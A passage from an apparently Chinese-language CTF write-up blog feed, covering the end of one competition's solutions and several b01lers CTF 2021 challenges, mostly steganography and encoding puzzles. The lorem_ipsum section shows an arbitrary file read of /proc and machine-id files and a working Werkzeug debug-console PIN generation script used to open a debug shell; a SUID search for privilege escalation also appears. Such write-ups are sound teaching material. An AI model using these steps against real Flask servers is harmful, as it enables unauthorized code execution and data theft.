flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@1f3072aea021:~/html$ find /usr/<span class="built_in">local</span>/bin -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">&lt; find /usr/<span class="built_in">local</span>/bin -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/php</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1620049443407.2dd7c47cdc393ff1db87508c1ea764be60013542.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d0a13137-6a17-408a-8298-16b816f34806&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="冬奥会-is-coming"><a href="#冬奥会-is-coming" class="headerlink" title="冬奥会_is_coming"></a>冬奥会_is_coming</h3><p>附件给出了一张图片，使用 <code>binwalk -e</code> 可以分离出一个压缩文档。压缩包的备注中有 <code>eight numbers</code> 的提示，但是压缩包本身并没有被加密，因此猜测是有隐写。使用 010 editor 打开解压所得的音频文件可在其尾部发现如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆🎃✅⌨🔪❓🚫🐍🙃🔬✉👁😆🎈🐘🏎🐘🐘😂😎🎅🖐🐍✉🍌🌪🐎🍵✅🚪✖☃👣👉ℹ🔪🍎🔄👣🚪😁👣💵🐅🍵🔬🛩😇🖐🖐🎅✅🏎👌🚨😆🎤🎅🦓🌿🦓🙃✖🍌🛩😂👑🌏☃😇😍🛩🚹😀🍌🎈💧🗒🗒</span><br></pre></td></tr></table></figure><p>猜测是 emoji-aes 加密，但是使用冬奥会的日期作为 key 尝试解密并不成功，因此猜测在音频中仍然有信息。使用 MP3stego 配合冬奥会日期 <code>20220204</code> 作为 key 执行 <code>Decode.exe -X -P 20220204 .\encode.mp3</code> 可提取出如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e \xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e</span><br></pre></td></tr></table></figure><p>使用 CyberChef From Hex 解码后可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✌︎☝︎♓︎⧫︎☟︎◆︎♌︎❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎■︎♋︎❍︎♏︎♎︎📂︎♍︎♏︎🏱︎♏︎♋︎🙵♓︎⬧︎❖︎♏︎❒︎⍓︎♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎🕈︎♒︎⍓︎■︎□︎⧫︎⧫︎♋︎🙵♏︎♋︎●︎□︎□︎🙵♋︎⧫︎♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure><p>用 <a href="https://wingdingstranslator.com/">Wingdings Translator</a> 将其翻译后可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A︎G︎i︎t︎H︎u︎b︎r︎e︎p︎o︎s︎i︎t︎o︎r︎y︎n︎a︎m︎e︎d︎1︎c︎e︎P︎e︎a︎🙵i︎s︎v︎e︎r︎y︎i︎n︎t︎e︎r︎e︎s︎t︎i︎n︎g︎.︎W︎h︎y︎n︎o︎t︎t︎a︎🙵e︎a︎l︎o︎o︎🙵a︎t︎i︎t︎?︎</span><br></pre></td></tr></table></figure><p>在 GitHub 上搜寻 1cePeak 可以找到一个 repository，在其文件中可以找到如下关键内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">echo How_6ad_c0uld_a_1cePeak_be? &gt;&amp;2</span><br></pre></td></tr></table></figure><p>使用 <code>How_6ad_c0uld_a_1cePeak_be?</code> 作为 key 解密 emoji-aes 的密文可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e32f619b-dbcd-49bd-9126-5d841aa01767&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>b01lers CTF 2021</title>
      <link href="/zh-CN/posts/1ff2873b.html"/>
      <url>/zh-CN/posts/1ff2873b.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="gdpr"><a href="#gdpr" class="headerlink" title="gdpr"></a>gdpr</h3><p>查看页面源代码可以得到如下信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/flag_policy&quot;</span>&gt;</span>Flag policy:<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定向到 <code>/flag_policy</code> 即可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;annoying_but_good?&#125;</span><br></pre></td></tr></table></figure><h3 id="lorem-ipsum"><a href="#lorem-ipsum" class="headerlink" title="lorem_ipsum"></a>lorem_ipsum</h3><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>GET 参数 <code>animal</code> 处代码逻辑可用报错带出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    f = request.args.get(<span class="string">&#x27;animal&#x27;</span>, <span class="string">&#x27;dogs&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = f.read(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;blockquote&gt;&#123;&#125;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p>可以知道此处存在任意文件读取，且仅可读取 200 长度的内容。尝试读取 <code>/proc/self/cmdline</code> 可得如下信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3 /home/loremipsum/loremipsum.py</span><br></pre></td></tr></table></figure><p>同时尝试传入 <code>animal=flag</code> 可以得到内容而不是报错，猜测 flag 文件就存在当前目录下。下一步要做的就是突破文件读取长度限制。</p><h4 id="Werkzeug-Debug-Console-PIN-Crack"><a href="#Werkzeug-Debug-Console-PIN-Crack" class="headerlink" title="Werkzeug Debug Console PIN Crack"></a>Werkzeug Debug Console PIN Crack</h4><blockquote><p>参考：<a href="https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug">https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug</a></p></blockquote><p>参考文章中有逆向 Werkzeug Debug Console 的 PIN 生成原理的内容，这里直接贴脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;web3_user&#x27;</span>,  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.5/dist-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;279275995014060&#x27;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;d4e6cb65d59544f3331ea0425dc555a1&#x27;</span>  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"><span class="comment"># h.update(b&#x27;shittysalt&#x27;)</span></span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p><code>/sys/class/net/ens33/address</code> 读取到 MAC 地址 <code>02:42:ac:1b:00:02</code> 并将其<a href="https://www.vultr.com/resources/mac-converter/">转换</a>成十进制 <code>2485378547714</code>。<code>/proc/self/environ</code> 可以包含出 username 为 <code>loremipsum</code>。之前的报错中可以找到 flask 的运行文件的绝对路径 <code>/usr/local/lib/python3.6/dist-packages/flask/app.py</code>。</p><blockquote><h4 id="machine-id-not-found"><a href="#machine-id-not-found" class="headerlink" title="machine-id not found"></a>machine-id not found</h4><p>使用 <code>boot-id + cgroup</code> 来代替所需的 machine-id。<code>/proc/sys/kernel/random/boot_id</code> 读出一个所需的 boot-id <code>b875f129-5ae6-4ab1-90c0-ae07a6134578</code>。<code>/proc/self/cgroup</code> 可以读到 cgroup，从中选一个与 boot-id 拼接起来得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b875f129-5ae6-4ab1-90c0-ae07a6134578e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae</span><br></pre></td></tr></table></figure></blockquote><p>将上述得到的内容填进脚本中运行可得 PIN 为 <code>126-739-410</code>。直接在报错页面解锁 Debug Shell 然后读取文件即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617678191018.bd83098f3c53633a473db247b076ec5cc8f3bf77.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b0ctf&#123;Fl4sK_d3buG_is_InseCure&#125;</span><br></pre></td></tr></table></figure><h3 id="Pyjailgolf-1"><a href="#Pyjailgolf-1" class="headerlink" title="Pyjailgolf 1"></a>Pyjailgolf 1</h3><p>题目给出的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">line = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;[REDACTED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(line) &gt; <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">eval</span>(line)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>此时只需要使用报错带出 flag 即可，因此构造出 <code>help(flag)</code> 即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">help</span>(flag) </span><br><span class="line">No Python documentation found <span class="keyword">for</span> <span class="string">&#x27;pctf&#123;JusT_a5k_4_h3lP!&#125;&#x27;</span>.</span><br><span class="line">Use <span class="built_in">help</span>() to get the interactive <span class="built_in">help</span> utility.</span><br><span class="line">Use <span class="built_in">help</span>(str) <span class="keyword">for</span> <span class="built_in">help</span> on the str class.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pctf&#123;JusT_a5k_4_h3lP!&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="NSNC"><a href="#NSNC" class="headerlink" title="NSNC"></a>NSNC</h3><p>题目附件是一张图，仔细观察可以发现有分开的两半二维码，将其修正一下。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617544624997.be5f53c326a1ed3cb6d9946b1156cc3269edc882.png@300w"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617544675500.6a73bf006f5a53ad8c2096ab97716d215ce6850e.png@200w" alt="image-20210404215755317"></p><p>扫描二维码可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MJRXIZT3NZPWKZTGL52GKZLTL5RWC3TUL5RDGX3XGBZG4X3MNFVTGX3SMU2GYX3UGMZXG7I&#x3D;</span><br></pre></td></tr></table></figure><p>Base32 解码一次可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;n_eff_tees_cant_b3_w0rn_lik3_re4l_t33s&#125;</span><br></pre></td></tr></table></figure><h3 id="Elfcraft"><a href="#Elfcraft" class="headerlink" title="Elfcraft"></a>Elfcraft</h3><p>附件给出的是一堆 mcfunction 文件，将其使用指令拼接起来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> *.mcfunction &gt;&gt; combination.mcfunction</span><br></pre></td></tr></table></figure><p>观察其数据特征可知其中包含着三维坐标且 y 轴大部分为 -1。因此将 x, z 两个轴的内容用正则稍微处理后提取出来之后写个脚本尝试构建图片。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;execute as @a\[scores&#x3D;&#123;search&#x3D;1&#125;\] if block ~(\d&#123;1,3&#125;) ~-1 ~(\d&#123;1,3&#125;) minecraft:white_concrete run&#x2F;</span><br><span class="line">&#x2F;scoreboard players add @a localChecks 1&#x2F;</span><br><span class="line">&#x2F;execute as @a.*\n&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL</span><br><span class="line"></span><br><span class="line">img = PIL.Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">15</span>, <span class="number">1367</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">coords = <span class="built_in">open</span>(<span class="string">&#x27;...\\combination.mcfunction&#x27;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> coordsLine <span class="keyword">in</span> coords:</span><br><span class="line">    x, y = coordsLine.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    img.putpixel((<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)), (<span class="number">16</span>,<span class="number">63</span>,<span class="number">145</span>))</span><br><span class="line">img.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到的图片上有一些 hex 数据。</p><blockquote><p>result.png 太长了不是很好放👇</p><p><a href="https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617686622772.1c48fb58d955ad4e795f53033468e1def00db69b.png">https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617686622772.1c48fb58d955ad4e795f53033468e1def00db69b.png</a></p></blockquote><p>将其中的内容转写，可得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">7F 45 4C 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">02 00 03 00 01 00 00 00 54 80 04 08 34 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 34 00 20 00 01 00 00 00</span><br><span class="line">00 00 00 00 01 00 00 00 00 00 00 00 00 80 04 08</span><br><span class="line">00 80 04 08 E4 00 00 00 E4 00 00 00 05 00 00 00</span><br><span class="line">00 10 00 00 C7 04 24 00 00 00 00 C7 44 24 FC 00</span><br><span class="line">00 00 00 C7 44 24 F8 00 00 00 00 C7 04 24 00 00</span><br><span class="line">00 00 BA 01 00 00 00 89 E1 BB 00 00 00 00 B8 03</span><br><span class="line">00 00 00 CD B0 0F B6 54 24 FC 0F B6 8A CB 80 04</span><br><span class="line">08 0F B6 14 24 31 D1 89 4C 24 F8 BA 01 00 00 00</span><br><span class="line">89 E1 83 E9 08 BB 01 00 00 00 B8 04 00 00 00 CD</span><br><span class="line">80 8B 4C 24 FC 41 89 4C 24 FC 83 F9 19 7C C6 BB</span><br><span class="line">00 00 00 00 B8 01 00 00 00 CD B0 00 01 16 04 19</span><br><span class="line">0F 53 0C 51 01 10 03 56 04 16 3D 27 2E 24 01 10</span><br><span class="line">56 04 16 1F</span><br></pre></td></tr></table></figure><p>很容易得知这是个 ELF 文件，此时再使用 IDA 打开这个文件。可以看到其反编译代码中有如下几句。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int8)retaddr ^ *((<span class="keyword">unsigned</span> __int8 *)&amp;loc_80480CB + (<span class="keyword">unsigned</span> __int8)v6);</span><br><span class="line">  v1 = sys_write(<span class="number">1</span>, &amp;v5, <span class="number">1u</span>);</span><br><span class="line">  v3 = v6 + <span class="number">1</span>;</span><br><span class="line">  v6 = v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以推测使用了亦或的方法。因为数据在 <code>loc_80480CB</code> 的位置，因此将此处及其后面的内容提取出来，做亦或操作。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617687947254.eb44c22f6a137a8d0b9834285349510a24c442e7.png"></p><p>因为 flag 以 b 开头，且数据第一位为 <code>00</code>，因此尝试将提取出来的内容亦或字符 b。此时可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;m1n3cra4ft_ELFcr4ft&#125;</span><br></pre></td></tr></table></figure><h3 id="Bars-Windchests-Vocals"><a href="#Bars-Windchests-Vocals" class="headerlink" title="Bars, Windchests, Vocals"></a>Bars, Windchests, Vocals</h3><blockquote><p>Hint! The problem gives you an actual flag, it is not just a long number.<br>Hint! The long number you get <em>is</em> the flag (in a form that computers love). It is in bctf{…} format, all bells and whistles are included in it.</p></blockquote><p>附件给出的是一个包含很多乐谱的 PDF 文件，在其最后一页可以发现如下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d85896c2-0d15-4b2b-9a86-670436c6ab3d/1617870522255.5f6a875934623950158379f8b6d6daa577e1a4f7.png"></p><p>搜索巴赫的作品可以发现一个 BWV 编号，类似如下内容。（这里作品编号太多了，参考了大佬的 <a href="https://github.com/franfrancisco9/B01lers_CTF">WriteUp</a>）</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gib dich zufrieden BWV 510</span><br><span class="line">Präludium und Fuge As-Dur BWV 862</span><br><span class="line">Befiehl du deine Wege BWV 272</span><br><span class="line">Prelude and Fugue in C major BWV 870</span><br><span class="line">Praeludium et Fuga BWV 546</span><br></pre></td></tr></table></figure><p>查找所给附件中所有作品的编号并对应罗马数字可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">I &#x3D; 510</span><br><span class="line">II &#x3D; 862</span><br><span class="line">III &#x3D; 272</span><br><span class="line">IV &#x3D; 870</span><br><span class="line">V &#x3D; 546</span><br><span class="line">VI &#x3D; 146</span><br><span class="line">VII &#x3D; 189</span><br><span class="line">VIII &#x3D; 563</span><br><span class="line">IX &#x3D; 354 </span><br><span class="line">X &#x3D; 996</span><br><span class="line">XI &#x3D; 765</span><br><span class="line">XII &#x3D; 565</span><br></pre></td></tr></table></figure><p>将所得的全部数字按照顺序连接起来得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">510862272870546146189563354996765565</span><br></pre></td></tr></table></figure><p>使用 <code>long_to_bytes(510862272870546146189563354996765565).decode()</code> 即可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;JSB&#x2F;rOcKs&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2021.March</title>
      <link href="/zh-CN/posts/9a222575.html"/>
      <url>/zh-CN/posts/9a222575.html</url>
      
